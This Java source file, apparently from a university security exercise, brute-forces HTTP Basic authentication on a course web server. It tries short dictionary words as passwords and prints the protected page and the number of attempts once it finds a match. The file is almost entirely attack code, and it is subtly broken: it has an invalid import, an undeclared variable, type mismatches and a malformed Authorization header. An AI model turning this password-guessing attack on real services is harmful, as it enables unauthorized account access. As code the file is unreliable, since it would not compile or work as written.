

import java.awt.*;
import java.String;
import java.util.*;
import java.io.*;
import java.net.*;



public class Dictionary
{
   private URL url;
   private HttpURLConnection connection ;
   private int stopTime = 0;
   private int startTime = 0;
   private int count = 0;

   public Dictionary()
   {
      System.out.println("Process is running...");
      startTime = System.currentTimeMillis();
      findWords();
   }

   public static void main(String args[])
   {
      Dictionary sc = new Dictionary();
   }
   
   
   public void findWords()
   {
      try
      {
         BufferedReader input = new BufferedReader(new FileReader ("words"));
         String text;
         while ((text = input.readLine()) != null)
         {
            if ((text.length() == 3) || (text.length() == 2))
            {
                count++;
                decision(text);
            }

          }

      }
      catch (IOException io)
      {
         System.out.println("File Error: " + io.getMessage());
      }
   }
   
   
   public void decision(String s1)
   {
      if (find(s1) == 200)
      {
         stopTime = System.currentTimeMillis();
          runTime = stopTime - startTime;
         System.out.println("***************************************");
         System.out.println("\nAttack successfully");
         System.out.println("\nPassword is: " + s1);
         System.out.println("\nThe contents of the Web site: ");
         displayContent(s1);
         System.out.println("\nTime taken  crack: " + runTime + " millisecond");
         System.out.println("\nNumber of attempts: " + count);
         System.out.println();

         System.exit(0);
      }
   }
   
   
   public int find(String s1)
   {
      int responseCode = 0;
      try
      {
         url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         connection = (HttpURLConnection)url.openConnection();

         connection.setRequestProperty("Authorization"," " + MyBase64.encode("" + ":" + s1));

         responseCode = connection.getResponseCode();

      }catch (Exception e)
      {
          System.out.println(e.getMessage());
      }
      return responseCode;
   }
   
   public void displayContent(String pw)
   {
      BufferedReader bw = null ;
      try
      {
         url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         connection = (HttpURLConnection)url.openConnection();

         connection.setRequestProperty("Authorization"," " + MyBase64.encode("" + ":" + pw));
         InputStream stream = (InputStream)(connection.getContent());
         if (stream != null)
         {
             InputStreamReader reader = new InputStreamReader (stream);
             bw = new BufferedReader (reader);
             String line;

             while ((line = bw.readLine()) != null)
             {
                System.out.println(line);
             }
        }
      }
      catch (IOException e)
      {
         System.out.println(e.getMessage());
      }
   }
}




